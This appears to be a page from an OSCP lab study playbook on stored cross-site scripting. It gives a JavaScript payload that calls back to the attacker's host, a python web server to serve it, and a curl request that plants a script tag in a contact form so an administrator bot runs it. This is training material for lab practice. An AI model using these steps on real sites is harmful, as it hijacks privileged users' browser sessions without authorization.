# Linux - Stored XSS

**Step 8B of 50 · Linux**

*Store JavaScript in an application field so an administrator bot renders it, then use the bot’s privileged browser session to request your payload.*

## When to use this page

Use this page when a contact form or profile field stores your input and an administrator or review bot visits it later. Stored cross-site scripting (XSS) means the application saves JavaScript and runs it in another user’s browser. This is asynchronous, so prepare the listener and payload before submitting the form.

## Create the callback payload

The payload loads a JavaScript file from your Kali web server. Keep the callback file separate from the form value so you can edit it without resubmitting the form.

> **Why:** This command writes a JavaScript payload that asks the privileged browser to load a second resource from your Kali host; look for an HTTP request from the bot.
```bash
cat > $BoxDir/www/malicious.js <<'EOF'
fetch('http://$LocalIP:$Port/?marker=stored-xss');
EOF
```

> **Why:** This server makes `malicious.js` available to the administrator bot; the request log is the success signal that the bot fetched your payload.
```bash
cd $BoxDir/www && python3 -m http.server $Port
```

## Submit through the contact form

Use the exact field and encoding expected by the application. In WonderCMS-style fields, a plus sign can preserve the intended space between `script` and `src` after form decoding.

> **Why:** This request stores a script reference in the contact form; success is a later request from the administrator bot to your Kali server.
```bash
curl -s -X POST "http://$BoxIP/contact.php" \
  --data-urlencode "website=<script+src=http://$LocalIP:$Port/malicious.js></script>"
```

## Example output

```text
GET /malicious.js HTTP/1.1 200
```

## What did you get?

- [ ] The bot requests `malicious.js` → **Run `grep malicious.js $BoxDir/loot/callback.log` to confirm the request, then follow the application-specific admin path on this page**
- [ ] The form accepts the value but no callback arrives → **Wait through one review interval, run `ss -ltnp | grep $ListenPort`, then run `curl -I http://$LocalIP:$ListenPort/malicious.js`**
- [ ] The page displays escaped text → **The field is HTML-escaped; treat this input as a dead end and return to Step 5 · [[Linux - Web Enum]]**
- [ ] The callback server receives nothing after a confirmed retry → **Stop submitting the form, run `pkill -f 'python3 -m http.server'`, then move to Step 10 · [[Linux - Exploit Search]]**

## Notes

The administrator bot is a browser process, not a shell on the target. A callback proves script execution in that browser context; it does not by itself prove operating-system command execution.

## Gotcha

> [!warning] 💡
> Stored XSS is time-dependent. Do not spam the form, and do not place real credentials or flag values in callback URLs. Use a harmless marker while proving the bot visits your payload.

## Additional routing

- [ ] The administrator bot loads the harmless marker → **Run `grep marker $BoxDir/loot/callback.log`, then continue with the application-specific escalation steps in this page**
- [ ] The field is escaped or the bot is absent → **Return to Step 5 · [[Linux - Web Enum]] and continue ordinary application enumeration**
## Seen in
- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- confirmed in the box write-up

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
